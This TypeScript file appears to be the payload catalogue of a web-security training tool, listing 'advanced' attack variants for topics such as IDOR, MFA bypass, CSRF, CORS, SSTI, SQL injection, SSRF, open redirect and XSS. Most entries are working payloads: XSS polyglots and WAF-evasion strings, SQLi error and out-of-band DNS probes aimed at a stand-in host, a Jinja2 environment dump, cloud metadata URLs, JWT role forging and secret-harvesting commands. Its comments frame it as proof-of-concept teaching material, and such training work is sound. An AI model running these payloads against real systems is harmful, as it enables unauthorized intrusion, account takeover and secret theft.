// Advanced payload / technique variants, appended to each deep topic's base
// payloads[] by the learn.ts resolver (keyed by LearnTopic.id).
//
// Same contract as the base payloads already in the group files:
//  - benign PROOF-OF-CONCEPT markers only (alert(document.domain), {{7*7}},
//    OOB/interactsh callbacks, read-only identity/version reads),
//  - in-scope assets only, prove impact WITHOUT touching real data,
//  - nothing destructive, no DoS, no mass-targeting.
// For injection leaves these are advanced payload variants; for recon /
// methodology leaves they are advanced confirmation techniques (the base
// arrays already mix both). This is the same genre as OWASP / PortSwigger
// Academy / PayloadsAllTheThings educational references.
//
// A leading divider row marks where the advanced set begins in the UI list.

const ADV = "──────── Advanced variants ────────";

export const ADVANCED_PAYLOADS: Record<string, string[]> = {
  // ── Access Control ────────────────────────────────────────────────────────
  idor: [
    ADV,
    "GET /api/v2/invoices/4190.json  vs  /4190  (format/extension swap re-exposes an object the HTML view authorizes away)",
    "POST /graphql  node(id:\"<base64(Invoice:4190)>\")  (decode the Relay global-id, change the inner id, re-encode)",
    "X-Original-URL: /api/admin/invoices/4190   /   X-Rewrite-URL: …  (edge ACL keys on path, origin trusts the override header)",
    "Resend with  Content-Type: application/xml  (alternate parser skips the JSON ownership filter)",
    "id=4190%00  /  {\"id\":{\"$ne\":null}}  (null-byte / operator type-confusion slips the owner check)",
  ],
  privesc: [
    ADV,
    "POST /api/graphql  mutation{ updateUser(id:<self>, input:{role:ADMIN}) }  (GraphQL mutation the REST ACL never guards)",
    "Verb swap: a GET-protected route reached via POST / PUT / HEAD  (framework dispatches the unlisted verb unchecked)",
    "X-Forwarded-For: 127.0.0.1  /  X-Forwarded-Host  spoof  (gateways that grant admin to 'internal' source IPs)",
    "Re-sign the JWT  {\"role\":\"user\"}→{\"role\":\"admin\"}  after an alg:none / HS256-confusion check (see JWT lesson)",
  ],
  "user-enum": [
    ADV,
    "Compare Content-Length on reset for known vs unknown — identical wording, different byte length still leaks",
    "GraphQL batch aliases: { a:userExists(email:\"a@x\") b:userExists(email:\"b@x\") … }  (100 checks/request, dodges per-request limits)",
    "OAuth 'Login with Google' for an unregistered email → distinct 'no account' redirect vs silent account-link",
    "Registration race: submit the same email twice in parallel → the uniqueness error reveals a pre-existing account",
  ],
  "pw-confirm-bypass": [
    ADV,
    "currentPassword as an ARRAY: {\"currentPassword\":[\"x\"],\"newPassword\":\"…\"}  (type-confusion skips the strcmp)",
    "HTTP param pollution: currentPassword=wrong&currentPassword=  (last-wins picks the empty value)",
    "Downgrade to multipart/form-data or XML on the same route (alternate parser drops the confirm field)",
    "Replay the GraphQL changePassword(new:\"…\")  mutation with the currentPassword argument omitted (schema marks it optional)",
  ],

  // ── Authentication ──────────────────────────────────────────────────────────
  "mfa-bypass": [
    ADV,
    "Backup/recovery code field accepts the SAME code twice, or has no attempt limit (enumerate 00000000…)",
    "Step-up swap: complete the factor on YOUR account, then replay the 'mfa_verified' cookie/claim onto the victim-stage request",
    "Remember-device cookie transferred to a fresh login → second factor skipped entirely",
    "Alternate endpoint (GraphQL / older API) for the same login that never enforces the 2FA state machine",
  ],
  "session-fixation": [
    ADV,
    "Pre-login CSRF sets a known cookie from a sibling subdomain, then the SSO callback adopts it with no rotation",
    "Fixate the OAuth state / PKCE verifier so the victim's auth code binds to the attacker's pre-seeded session",
    "Non-rotation proof: capture SESSIONID pre-auth, authenticate, diff — an identical value is the bug",
  ],
  "session-invalidation": [
    ADV,
    "Change email/password, then replay the OLD JWT until its exp — stateless tokens aren't revoked server-side",
    "Revoke one device/session in the UI, then keep using that exact token elsewhere (revocation not enforced)",
    "OAuth: revoke app access, replay the still-valid access_token (no introspection on the resource server)",
  ],
  "cleartext-session": [
    ADV,
    "testssl.sh / sslscan target:443  → TLS1.0/1.1 or export ciphers still offered = downgrade-able transport",
    "Auth cookie without a  __Host-/__Secure-  prefix (the prefix would force Secure + Path and block downgrade leaks)",
    "Mixed content: an http:// asset on the authenticated page leaks the cookie on that sub-request",
  ],

  // ── CSRF / CORS ───────────────────────────────────────────────────────────
  csrf: [
    ADV,
    "SameSite bypass via a GET-method state change, or a top-level <form> navigation (Lax still sends on nav)",
    "multipart/form-data smuggling: a body the server parses as JSON but the browser sends with no preflight",
    "Token not bound to the user: swap in a DIFFERENT valid session's CSRF token (still accepted = broken)",
    "method=POST with  _method=PUT  override to reach a route whose only CSRF guard is on PUT",
  ],
  clickjacking: [
    ADV,
    "Framability check first:  curl -sI <url> | grep -iE 'x-frame-options|content-security-policy'  (frame-ancestors absent = testable)",
    "Drag-and-fill clickjacking: the lure drags a value/token out of the framed app into an attacker-controlled field",
    "Nested/‘double’ clickjack on an OAuth consent dialog that omits frame-ancestors → one-click Authorize",
  ],
  cors: [
    ADV,
    "Scheme/port downgrade: Origin: http://target.example  or  :8443  trusted though the main site is https-only",
    "Weak-regex anchors: Origin: https://target.example.evil.example  /  https://evil.example%60target.example",
    "Trusted-subdomain pivot: pop a reflected XSS on an allowed sibling, then read the credentialed API from that origin",
  ],

  // ── Information Exposure ──────────────────────────────────────────────────
  "disclosure-of-secrets": [
    ADV,
    "noseyparker scan ./bundles && noseyparker report  (fast rules over a huge JS/git history)",
    "GET /.git/  →  git-dumper  to reconstruct source, then grep the working tree for live keys (read-only)",
    "Source-map pull: fetch the *.js.map referenced by a bundle → original TS + secrets in comments",
    "For a found cloud key: ONE scoped identity read only (gcloud auth list / az account show) — never enumerate resources",
  ],
  "subdomain-takeover": [
    ADV,
    "NS-delegation takeover: a dangling NS record pointing to a sweepable DNS-provider zone you can register",
    "CDN re-claim: a dangling CNAME to a provider where the exact hostname can be claimed on a free account",
    "Benign control proof: serve  /.well-known/takeover-poc-<handle>.txt , screenshot, then release the claim",
  ],
  "token-leakage": [
    ADV,
    "window.name persistence: a value that survives a cross-origin navigation and carries a token off-site",
    "postMessage('*') wildcard target → a token broadcast to any listening frame (log event.data in DevTools)",
    "CacheStorage / service-worker inspection: tokens cached in caches.open(...) readable to same-origin script",
  ],
  "exif-geolocation": [
    ADV,
    "PDF/DOCX metadata:  exiftool -Author -Creator -GPS* served-doc.pdf  (office exports leak author + local path)",
    "Nested thumbnail keeps GPS though the main image is stripped:  exiftool -b -ThumbnailImage f.jpg | exiftool -",
    "Video:  exiftool -GPSCoordinates -CreationDate clip.mp4  (MP4/MOV retain capture location)",
  ],
  "verbose-errors-debug": [
    ADV,
    "Field-suggestion 'clairvoyance' with introspection OFF: send near-miss field names, harvest the 'Did you mean …' leaks",
    "Fetch *.js.map / /_next/ → rebuild server-component names and hidden routes from the source map",
    "Oversized/deeply-nested JSON body → 500 with a stack trace carrying absolute paths + framework version",
    "Spring:  /actuator/env  /  /actuator/heapdump  (env dumps secrets) — read-only confirm, then stop",
  ],
  "email-spoofing": [
    ADV,
    "DMARC alignment gap: pass SPF/DKIM on a look-alike/sub-domain while  From:  shows the org domain (relaxed alignment)",
    "Display-name spoof:  From: \"Payroll <payroll@target.com>\" <attacker@evil>  — passes DMARC on evil, shows the org in clients",
    "Stale SPF include: a decommissioned third-party SaaS sender still authorized via  include:  in the SPF record",
  ],

  // ── Injection ───────────────────────────────────────────────────────────────
  ssti: [
    ADV,
    "Engine echoes: {$smarty.version} (Smarty) · {=7*7} (Pebble/Latte) · @(7*7) (.NET Razor) · ${7*7} (Java EL/Freemarker)",
    "Jinja2 read-only proof (no shell): {{ cycler.__init__.__globals__.os.environ }}  (dumps env, not commands)",
    "Blind SSTI → OOB: {{ ''.__class__ }} variants that trigger an interactsh DNS hit confirm server-side eval",
    "{{7*'7'}} → 7777777 (Jinja2) vs 49 (Twig); {7*7} vs ${7*7} vs #{7*7} to disambiguate the engine",
  ],
  crlf: [
    ADV,
    "Cache-poisoning split:  %0d%0aX-Forwarded-Host:evil  then confirm it keys the cached response",
    "Lone-CR fold:  %0d  only — some stacks treat a bare CR as a header boundary",
    "Double-decode:  %250d%250a  /  %23%0d%0a  survives one decode pass, then splits on the second",
  ],
  "content-spoofing": [
    ADV,
    "Markdown/MathML injection in a renderer: [click](javascript:…) or ![](onerror=…) that survives the sanitizer",
    "SVG <text>/<a> injection where uploaded images render inline in the app origin",
    "RTLO / homoglyph text spoof inside a trusted label (visual, not markup — frame the phishing impact)",
  ],
  "sqli-ceiling": [
    ADV,
    "Error-based single value: ' AND extractvalue(1,concat(0x7e,version()))-- -  (banner in the error, zero rows read)",
    "Boolean oracle: ' AND substr(version(),1,1)>'4'-- -  (one bit of proof, never dumps data)",
    "OOB confirm (no exfil): MySQL/MSSQL DNS marker  load_file(CONCAT('\\\\\\\\',@@version,'.oob.example\\\\x'))  — avoid INTO OUTFILE (destructive)",
    "Second-order marker: store a benign canary that fires in a later admin query (prove reach, don't exfiltrate)",
  ],

  // ── Server Misconfiguration ─────────────────────────────────────────────────
  "exposed-portal": [
    ADV,
    "Vhost brute:  ffuf -H 'Host: FUZZ.target.com' -u https://<ORIGIN_IP>/  (surfaces internal-only consoles)",
    "Favicon-hash fingerprint:  shodan 'http.favicon.hash:<hash>'  (Kibana/Grafana/Jenkins/phpMyAdmin at a glance)",
    "Documented default creds — ONE attempt only, then stop (admin/admin etc.); never spray",
  ],
  "no-rate-limiting": [
    ADV,
    "GraphQL alias amplification: one request carrying 100 login aliases bypasses per-request throttles",
    "Header-rotation set to find the trusted one:  X-Forwarded-For / X-Real-IP / X-Client-IP / Forwarded",
    "Case-vary the username (Victim vs victim) to reset a per-account attempt counter",
  ],
  "missing-cookie-flags": [
    ADV,
    "SameSite=None without Secure on the session cookie (browser rejects / cross-site send mis-enabled)",
    "Session cookie scoped to the parent domain (.target.com) → readable by a less-trusted subdomain",
    "Auth cookie lacking the  __Host-  prefix (allows path/domain scoping attacks)",
  ],
  "security-headers": [
    ADV,
    "CSP audit via csp-evaluator → unsafe-inline, wildcard sources, or missing object-src/base-uri that re-enable XSS",
    "HSTS without includeSubDomains/preload → a subdomain is still downgrade-able",
    "Absent COOP/COEP/CORP → XS-Leaks / cross-origin side channels on an authenticated page",
  ],
  "oauth-account-squatting": [
    ADV,
    "redirect_uri validation: append  ?x=.evil  /  %2f%2e%2e  / an open-redirect chain on an allowlisted host",
    "Missing state/nonce → login-CSRF to force-link the victim's account to the attacker's IdP",
    "Email-change-after-link: claim the victim email, change yours later while the old binding persists",
  ],
  "dbms-misconfiguration": [
    ADV,
    "Redis unauth:  redis-cli -h host PING / INFO  (no AUTH = exposed) — read-only, never CONFIG SET",
    "MongoDB:  mongosh 'mongodb://host' --eval 'db.adminCommand({listDatabases:1})'  (anonymous listing)",
    "Elasticsearch:  curl -s host:9200/_cat/indices  (open index listing)",
    "Postgres trust-auth:  psql 'host=host user=postgres' -c '\\conninfo'  (connects with no password)",
  ],
  "lack-of-password-confirmation": [
    ADV,
    "Each sensitive action separately (email / phone / 2FA-disable / API-key create) tested for a re-auth gate",
    "GraphQL  deleteAccount  mutation with no 'password' argument in the schema",
    "Step-up reuse: the 'sudo mode' cookie from one action accepted on all others, past its intended TTL",
  ],
  "captcha-implementation": [
    ADV,
    "Response tamper: {\"captchaValid\":false}→true where the client echoes the server's verdict",
    "Reuse one token across DIFFERENT actions (login vs signup vs reset) — single verify, many uses",
    "siteverify not pinned to the host → a token minted on another domain is accepted",
    "reCAPTCHA v2 'checkbox' omitted (empty g-recaptcha-response) yet the action still proceeds server-side",
  ],
  "waf-bypass": [
    ADV,
    "Origin discovery:  censys/shodan ssl.cert CN:target.com  + DNS-history A-records + SPF  include:  ranges",
    "Parser-differential: duplicate/space-padded headers, chunked body, or key-casing the WAF ignores but the app parses",
    "Normalization gaps the edge folds but the origin doesn't:  //admin , /%2e/admin , /ADMIN , trailing %00 / %09",
    "jarm + favicon-hash to confirm the bare origin is the same app before re-testing the masked vuln",
  ],

  // ── SSRF / Redirect ──────────────────────────────────────────────────────
  ssrf: [
    ADV,
    "Azure IMDS:  http://169.254.169.254/metadata/instance?api-version=2021-02-01   [Metadata: true]",
    "DNS-rebinding TOCTOU: a host that resolves public at validation then 169.254.169.254 at fetch time",
    "Blind confirm: a unique interactsh subdomain per parameter → the callback proves server-side fetch and records the egress IP",
    "Short-form / alt-scheme dodges:  http://127.1 , http://0/ , file:///etc/hostname , dict:// , ftp://",
    "Injection surfaces beyond URL fields: PDF/SVG/thumbnail renderers and webhook 'test' buttons",
  ],
  "open-redirect": [
    ADV,
    "Single-slash / backslash:  ?url=https:/evil.example   and   ?url=https:%5c%5cevil.example  (parser normalizes)",
    "Allowlist suffix/traversal:  ?url=https://target.com.evil.example   and   ?url=https://evil.example%2f%2e%2e%2f",
    "javascript: sink:  ?url=javascript:alert(document.domain)  where the value reaches location.href",
    "Chain target: feed it into an OAuth redirect_uri or a login ?next= to turn the redirect into token theft",
  ],
  tabnabbing: [
    ADV,
    "Confirm window.opener is non-null in a CURRENT browser first — modern defaults make many of these N/A",
    "opener.postMessage probe: if the opener registers a listener, a cross-origin message is a stronger secondary finding",
    "Chain: phishing-redirect the opener to a pixel-perfect login clone and frame the credential-theft impact",
  ],

  // ── XSS ────────────────────────────────────────────────────────────────────
  "reflected-non-self": [
    ADV,
    "Context-agnostic polyglot:  jaVasСript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain))//",
    "JS template-literal / block close:  `${alert(document.domain)}`   and   </script><svg onload=alert(document.domain)>",
    "Quote-less attribute:  onfocus=alert(document.domain) autofocus  (no angle brackets required)",
    "WAF evasion:  <svg><animate onbegin=alert(document.domain) attributeName=x>  plus HTML-entity / overlong-UTF8 encodings",
    "DOM-only sink:  #<payload> via location.hash → innerHTML/eval (never reaches the server or WAF)",
  ],
  "stored-by-actor": [
    ADV,
    "Out-of-band blind-XSS: inject into name/UA/referer sinks that render only in an ADMIN panel (the callback proves the actor)",
    "Mutation-XSS: markup the sanitizer passes but the browser re-parses into script (DOMPurify-bypass class)",
    "Markdown/BBCode stored sink: [a](javascript:…) or ![](onerror=…) surviving the server-side sanitizer",
    "CSV/filename/profile-field stored, then rendered in a support or export view (cross-privilege execution)",
  ],
  "uxss-referer-datauri": [
    ADV,
    "iframe srcdoc:  <iframe srcdoc=\"<svg onload=alert(document.domain)>\">  inherits the embedder origin",
    "SVG  <use xlink:href=\"data:…\">  that executes in the app origin",
    "Blob URL:  URL.createObjectURL(new Blob(['<script>…'],{type:'text/html'}))  navigated same-origin",
    "Always prove the executing origin: document.domain MUST equal the target, not an opaque/null context",
  ],
};
